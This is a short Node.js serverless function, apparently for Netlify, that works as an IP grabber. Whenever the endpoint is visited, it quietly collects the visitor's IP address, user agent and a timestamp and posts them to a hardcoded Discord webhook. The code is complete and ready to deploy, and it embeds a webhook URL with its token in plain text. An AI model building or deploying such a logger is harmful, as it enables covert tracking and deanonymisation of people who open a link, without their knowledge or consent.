const fetch = require('node-fetch');

exports.handler = async (event, context) => {
  const webhookURL = "https://discord.com/api/webhooks/1347303016960888862/tJhE5rbEck2YenBeyPQmP-8x60moVrX-4Xb7UTl6SSV0OT8A8HxbNKpUnWOU6Njf6qtQ";

  // Improved IP extraction
  const ip =
    event.headers['x-nf-client-connection-ip'] ||
    event.headers['client-ip'] ||
    event.headers['x-forwarded-for'] ||
    'Unknown IP';

  const userAgent = event.headers['user-agent'] || 'Unknown UA';
  const timestamp = new Date().toISOString();

  const ipMessage = { content: ip };
  const infoMessage = {
    content: `User Agent: ${userAgent}\nTimestamp: ${timestamp}`
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(ipMessage),
    });

    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(infoMessage),
    });

    return {
      statusCode: 200,
      body: 'IP logged successfully!',
    };
  } catch (error) {
    console.error('Webhook send failed:', error);
    return {
      statusCode: 500,
      body: 'Failed to send webhook',
    };
  }
};
